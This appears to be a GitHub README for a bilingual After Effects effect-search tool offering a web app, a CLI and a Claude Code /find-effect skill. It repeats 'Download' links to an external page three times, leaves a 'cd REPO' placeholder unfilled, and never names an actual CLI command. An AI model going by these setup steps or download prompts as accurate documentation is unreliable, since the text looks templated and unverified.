# AE Effects Database - After Effects Effects Search Database 2026

> **AE Effects Database provides web, CLI, and Claude Code tools for discovering After Effects effects through text or images. It includes bilingual search, suite-based filtering, and an extensible JSONL catalog.**

[![Platform](https://img.shields.io/badge/Platform-Web%2C%20CLI%2C%20Claude%20Code-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/michaelpehrhill2789/ae-effects-cli-search?style=flat-square)](https://github.com/michaelpehrhill2789/ae-effects-cli-search)

---

<p align="center">
  <a href="https://michaelpehrhill2789.github.io/ae-effects-cli-search/">
    <img src="https://img.shields.io/badge/Download-AE%20Effects%20Database%20Latest-brightgreen?style=for-the-badge" alt="Download AE Effects Database">
  </a>
</p>

> **[Download AE Effects Database](https://michaelpehrhill2789.github.io/ae-effects-cli-search/)**

---

[Download Latest Build](https://michaelpehrhill2789.github.io/ae-effects-cli-search/)

---

## What is AE Effects Database?

AE Effects Database turns After Effects effect information into a searchable reference for motion designers, editors, compositors, and technical artists. Describe the result you want with text or supply a reference image, then reduce the matches by effect category or vendor suite.

Its catalog covers built-in effects, third-party packages, and effects installed locally. Included sources include Adobe, Red Giant, Sapphire, Continuum, and aescripts. The collection is available through a GitHub Pages web app, a command-line workflow, and the Claude Code `/find-effect` skill.

---

## Highlights

- Find After Effects effects by entering natural-language descriptions.
- Discover possible effects from a reference image and its visual characteristics.
- Enter search terms in either Chinese or English.
- Narrow results using effect categories and vendor suites.
- Inspect records for built-in, third-party, and locally installed effects.
- Access the catalog through a GitHub Pages web interface.
- Perform searches directly from the command line.
- Use the `/find-effect` skill to connect the catalog with Claude Code.
- Review recipes that show how several effects can be combined into a stack.
- Add to the collection using the JSONL data format.

---

## Getting Started

### Web application

Launch the hosted application here:

[Open AE Effects Database](https://michaelpehrhill2789.github.io/ae-effects-cli-search/)

For local use, clone the repository and serve its files with a basic HTTP server:

```bash
git clone https://github.com/michaelpehrhill2789/ae-effects-cli-search.git
cd REPO
python -m http.server 8000
```

After starting the server, open `http://localhost:8000` in your browser.

### CLI and Claude Code

First place the repository somewhere your shell tools or Claude Code can access it:

```bash
git clone https://github.com/michaelpehrhill2789/ae-effects-cli-search.git
cd REPO
```

For local searches, use the CLI entry point provided by the repository. Claude Code users can install the skill by following the integration files included with the project.

---

## How to Use It

### Searching on the web

1. Open either the hosted application or the local server.
2. Type an effect description in Chinese or English.
3. Add a reference image when visual search would be helpful.
4. Limit the search by category or vendor suite if needed.
5. Examine the matching records and any effect-stacking recipes that are available.

### Searching from the command line

The CLI supports text-based searches and can apply category and suite filters. For example:

```text
Search for: atmospheric glow
Category: Light and Color
Suite: Sapphire
```

Run the repository's CLI search command to enter the query and use the available filters.

### Using Claude Code

When the Claude Code integration is installed, invoke the effect lookup skill like this:

```text
/find-effect atmospheric glow
```

A visual description, category, or preferred vendor suite can also be included to narrow the request.

---

## Data and Configuration

Effect records are kept in JSONL files. This makes the catalog easy to inspect one entry at a time and straightforward to expand. When editing the data, retain the established fields and the one-record-per-line arrangement.

The setup varies slightly by how you access the database:

- **Web:** host the repository files through GitHub Pages or a local HTTP server.
- **CLI:** configure the command-line workflow to use the local database supplied with the repository.
- **Claude Code:** make both the skill files and database files available in the project location used by Claude Code.
- **Data updates:** modify the appropriate JSONL records, then reload or restart the interface that consumes them.

---

## Requirements

- A current web browser for using the hosted or locally served interface.
- Git to clone the repository.
- Python or another HTTP server for serving the web files during local development.
- A command-line environment for running CLI searches.
- Claude Code when using the `/find-effect` integration.
- Enough local storage for the repository and its JSONL effect catalog.
- After Effects is useful for applying the effects you find, but it is not needed to browse the database.

---

## Frequently Asked Questions

### Who can use AE Effects Database?

The database is designed for After Effects users who want to identify effects, compare effect suites, search from a visual target, or build recipes from multiple effects.

### Are Chinese searches supported?

Yes. Searches can use both Chinese and English keywords.

### Which effect sources are represented?

The catalog includes built-in and third-party effects from sources such as Adobe, Red Giant, Sapphire, Continuum, and aescripts, along with effects installed locally.

### Is the hosted site required?

No. Clone the repository to use the local web files, JSONL catalog, CLI workflow, or Claude Code integration without the hosted website.

### How can I contribute an effect record?

Create a properly formatted entry in the relevant JSONL data file and follow the fields and conventions already used by the catalog.

### What should I do if local files do not load?

Serve the repository through a local HTTP server instead of opening the files directly from the filesystem. Make sure the server was started in the repository directory and that the browser is pointed to the correct local address.

### How do I report missing or incorrect information?

Open a GitHub issue or discussion in the repository and include details about missing effects, inaccurate metadata, search behavior, or integration problems.

---

## Planned Improvements

- Broaden coverage of built-in effects and third-party suites.
- Expand bilingual keywords and improve matching behavior.
- Continue developing image-based effect discovery.
- Provide additional reusable recipes for effect stacks.
- Further refine the CLI and Claude Code workflows.
- Preserve a practical JSONL schema for extensions maintained by the community.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
